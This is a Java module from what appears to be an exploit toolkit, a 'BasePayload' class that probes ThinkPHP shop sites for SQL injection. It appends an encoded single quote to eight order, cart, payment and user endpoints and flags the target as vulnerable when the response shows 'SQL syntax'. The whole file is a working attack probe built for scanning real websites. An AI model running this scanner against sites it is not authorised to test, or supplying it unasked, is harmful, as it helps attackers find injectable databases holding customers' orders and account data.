package com.leishianquan.exp;

import com.leishianquan.model.BasePayload;
import com.leishianquan.util.Dialog;
import com.leishianquan.util.HttpTool;

public class thinkphp_multi_sql_leak implements BasePayload {
    private static final String CheckStr="SQL syntax";

    public boolean checkVUL(String url) throws Exception{

        try {
            String test_result1= HttpTool.getHttpReuest(url + "/index.php?s=/home/shopcart/getPricetotal/tag/1%27", "utf-8");
            String test_result2= HttpTool.getHttpReuest(url + "/index.php?s=/home/shopcart/getpriceNum/id/1%27", "utf-8");
            String test_result3= HttpTool.getHttpReuest(url + "/index.php?s=/home/user/cut/id/1%27", "utf-8");
            String test_result4= HttpTool.getHttpReuest(url + "/index.php?s=/home/service/index/id/1%27", "utf-8");
            String test_result5= HttpTool.getHttpReuest(url + "/index.php?s=/home/pay/chongzhi/orderid/1%27", "utf-8");
            String test_result6= HttpTool.getHttpReuest(url + "/index.php?s=/home/order/complete/id/1%27", "utf-8");
            String test_result7= HttpTool.getHttpReuest(url + "/index.php?s=/home/order/detail/id/1%27", "utf-8");
            String test_result8= HttpTool.getHttpReuest(url + "/index.php?s=/home/order/cancel/id/1%27", "utf-8");
            if(test_result1.contains(CheckStr) | test_result2.contains(CheckStr)| test_result3.contains(CheckStr)| test_result4.contains(CheckStr) | test_result5.contains(CheckStr)| test_result6.contains(CheckStr)|test_result7.contains(CheckStr) |test_result8.contains(CheckStr)){
                return true;}
        } catch (Exception e) {
//            Dialog.alert_Dialog("txf提示你",null,"连接超时");
        }
        return false;
    }


}